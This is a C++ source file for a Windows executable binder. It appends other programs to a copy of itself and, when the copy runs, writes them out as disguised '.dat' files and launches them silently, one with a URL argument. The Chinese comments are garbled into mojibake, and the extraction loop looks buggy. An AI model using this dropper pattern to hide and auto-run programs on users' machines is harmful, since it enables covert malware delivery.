// Bundle.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <vector>
#include <string>
#include <windows.h>
#include <sys/stat.h>
using namespace std;

//���ﶨ��һ��ȫ�ֱ��������ڱ�Ǽ�¼�����ȵ�λ��
//�󶨳���ʱ��дfinderλ�ý������ĸ��ֽ�Ϊ������
//���ʱ���ɶ�ȡ��λ��ȡ��ԭ����������
struct MODIFY_DATA {
     unsigned int finder; // ����(��λ����)
     _off_t my_length;      //�ļ�����(����)
} modify_data = {0x12345678, 0};

//��������
vector<string> exe_to_bind;
char my_name[MAX_PATH] = {0};
int my_org_size = 74*1024;
const char UNBIND_PATH[] = "./";
string target_name = "out.exe";


//��������
bool bind_exes();
bool unbind_and_run();
void Create_Process(const char* exe_name, char* cmdline, bool async);

int main(int argc, char* argv[])
{
	::GetModuleFileName(0, my_name, sizeof(my_name));

	bool binding = false;

	if( argc > 1 )
	{
		for(int i=1; i<argc; i++)
		{
			if( stricmp(argv[i], "-b") == 0 )
			{
				binding = true;
				i++;
				exe_to_bind.push_back(string(argv[i]));
			}
			else if( stricmp(argv[i], "-o") == 0 )
			{
				i++;
				target_name = string(argv[i]);
			}
			else if( stricmp(argv[i], "-s") == 0 )
			{
				i++;
				my_org_size = atoi(argv[i]);
			}
		}
	}

	if( binding )
	{
		bind_exes();
		return 0;
	}
	else
	{
		struct _stat st;
		_stat(my_name, &st);
		if(st.st_size > my_org_size)
		{
			unbind_and_run();
			exit(0);
		}
	}

	return 0;
}

bool bind_exes()
{
	unsigned int finder = 0x12345678;
	struct _stat st;
	unsigned char* buf = NULL;
	FILE* myfile = NULL;
	FILE* outfile = NULL;

	_stat(my_name, &st);
	modify_data.my_length = st.st_size;
	if(modify_data.my_length <= 0)
	{
		printf("��������Ч, %d\n", modify_data.my_length);
		return false;
	}

	buf = new unsigned char[modify_data.my_length];
	if( buf == NULL )
		return false;

	myfile = fopen(my_name, "rb");
	if( myfile == NULL )
	{
		delete[] buf;
		return false;
	}

	long mybytes = fread(buf, 1, modify_data.my_length, myfile);
	fclose(myfile);

	if(mybytes != modify_data.my_length)
	{
		delete[] buf;
		printf("������ȫ��ȡ�����ļ����ݣ�%d/%d\n",modify_data.my_length, mybytes);
		return false;
	}

	//�ҵ�ȫ�ֱ���modify_data����ĵ�ַ��д��������
	int k = 0;
	int i = 0;
	for (i = 0; i < modify_data.my_length - sizeof(finder); i += sizeof(finder))
	{
		for (k = 0; k < sizeof(finder); k++)
		{
			if (buf[i+k] != ((BYTE*)&finder)[k])
				break;
		}
		if (k == sizeof(finder))   //��λ���������������ļ���С
		{			  
			memcpy(buf+ i, &modify_data, sizeof(modify_data));
			break;
		}
	}

	if( i >= modify_data.my_length - sizeof(finder) )
	{
		delete[] buf;
		return false;
	}

	outfile = fopen(target_name.c_str(), "wb");
	if( outfile == NULL )
	{
		delete[] buf;
		printf("��������ļ�ʧ��\n");
		return false;
	}

	int totalbytes = 0;

	//д������
	totalbytes += fwrite(buf, 1, mybytes, outfile);

	//д��󶨳������
	int exe_num = exe_to_bind.size();
	totalbytes += fwrite(&exe_num, 1, sizeof(exe_num), outfile);

	FILE* infile = NULL;
	for(int j=0; j<exe_num; j++)
	{
		string filepath = exe_to_bind[j];
		if(_stat(filepath.c_str(), &st) != 0 || st.st_size <= 0)
		{
			delete[] buf;
			printf("���ļ��У���ȡҪ�󶨵��ļ���ȡʧ��\n");
			return false;
		}

		infile = fopen(filepath.c_str(), "rb");
		if( infile == NULL )
		{
			delete[] buf;
			printf("��Ҫ�󶨵��ļ�ʧ��\n");
			return false;
		}

		//д���ļ���С
		totalbytes += fwrite(&st.st_size, 1, sizeof(st.st_size), outfile);

		//д���ļ�
		while( mybytes = fread(buf, 1, modify_data.my_length, infile) )
		{
			totalbytes += fwrite(buf, 1, mybytes, outfile);
		}
		fclose(infile);
	}

	fclose(outfile);
	delete[] buf;


	return true;
}

bool unbind_and_run()
{
	FILE* myfile = NULL;
	FILE* outfile = NULL;

	int totalbytes = 0;
	char tempname[MAX_PATH] = {0};

	if(modify_data.my_length <= 0)
	{
		printf("self finder failed.\n");
		return false;
	}

	unsigned char* buf = new unsigned char[modify_data.my_length];

	myfile = fopen(my_name, "rb");
	if( myfile == NULL )
	{
		delete[] buf;
		printf("unbinding: open self failed.\n");
		return false;
	}

	//�ƶ��������ĩβ
	fseek(myfile, modify_data.my_length, SEEK_SET);

	int exe_num = 0;
	if( fread(&exe_num, sizeof(exe_num), 1, myfile) == 0 )
	{
		delete[] buf;
		printf("read exe number failed.\n");
		return false;
	}

	int seeker = modify_data.my_length + sizeof(exe_num);
	for(int i=0; i<exe_num; i++)
	{
		memset(tempname, 0, MAX_PATH);
		sprintf_s(tempname, "%s/kmir%d.dat", UNBIND_PATH, i);
		outfile = fopen(tempname, "wb");
		if(outfile == NULL)
		{
			delete[] buf;
			printf("create out file failed, %d.exe\n", i);
			return false;
		}
		
		int exe_size = 0;
		if( fread(&exe_size, sizeof(exe_size), 1, myfile) == 0 )
		{
			delete[] buf;
			printf("read exe size failed, %d.exe\n", i);
			return false;
		}
		seeker += sizeof(exe_size);

		int readed = 0;
		totalbytes = 0;
		while (readed = fread(buf, 1, sizeof(buf), myfile))
		{
			if (totalbytes + readed > exe_size)
				readed = exe_size - totalbytes;
			totalbytes += fwrite(buf, 1, readed, outfile);
		}
		fclose(outfile); 

		seeker += exe_size;
		fseek(myfile, seeker, SEEK_SET);
	}

	fclose(myfile);
	delete[] buf;

	//run exes
	Create_Process("./kmir0.dat", NULL, true);
	Create_Process("./kmir1.dat", "/s /l http://www.baidu.com /t mir2.dat", true);

	return true;
}

void Create_Process(const char* exe_name,char* cmdline, bool async)
{
	HANDLE hProcess;
	HANDLE hThread;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	CreateProcess(exe_name, cmdline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);

	hProcess = pi.hProcess;
	hThread = pi.hThread;

	if(!async)
	{
		WaitForSingleObject(hProcess, INFINITE);
		//unlink(exe_name);
	}
}